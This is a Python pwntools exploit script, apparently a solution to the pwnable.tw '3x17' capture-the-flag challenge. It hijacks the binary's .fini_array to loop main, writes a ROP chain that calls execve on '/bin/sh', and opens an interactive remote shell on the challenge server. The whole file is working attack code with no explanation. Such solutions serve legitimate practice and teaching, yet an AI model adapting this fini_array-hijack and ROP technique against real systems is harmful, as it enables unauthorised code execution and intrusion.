#!/usr/bin/python3

from pwn import *

exe = context.binary = ELF('./3x17', checksec=False)
context.log_level = 'critical'

# p = process(exe.path)
p = remote('chall.pwnable.tw', 10105)

######################################
### Stage 1: Overwrite .fini_array ###
######################################
fini_array = 0x4b40f0
libc_csu_fini = 0x0402960
main = 0x401b6d
p.sendafter(b'addr:', f'{fini_array}'.encode())
p.sendafter(b'data:', flat(libc_csu_fini, main))

########################################
### Stage 2: Get shell with ROPchain ###
########################################
pop_rax = 0x000000000041e4af
pop_rdi = 0x0000000000401696
pop_rdx = 0x0000000000446e35
pop_rsi = 0x0000000000406c30
syscall = 0x00000000004022b4
rw_section = 0x000000004b4a00
read_addr = 0x446e20
payload = flat(
	pop_rdi, 0,
	pop_rsi, rw_section,
	pop_rdx, 8,
	0x446e20,
	pop_rax, 0x3b,
	pop_rdi, rw_section,
	pop_rsi, 0,
	pop_rdx, 0,
	syscall
	)
for i in range(0, len(payload), 0x18):
	p.sendafter(b'addr:', f'{fini_array+0x10+i}'.encode())
	p.sendafter(b'data:', payload[i:i+0x18])

leave_ret = 0x0000000000401c4b
ret = leave_ret + 1
p.sendafter(b'addr:', f'{fini_array}'.encode())
p.sendafter(b'data:', flat(leave_ret, ret))

input("Press ENTER to continue...")
p.send(b'/bin/sh\x00')

p.interactive()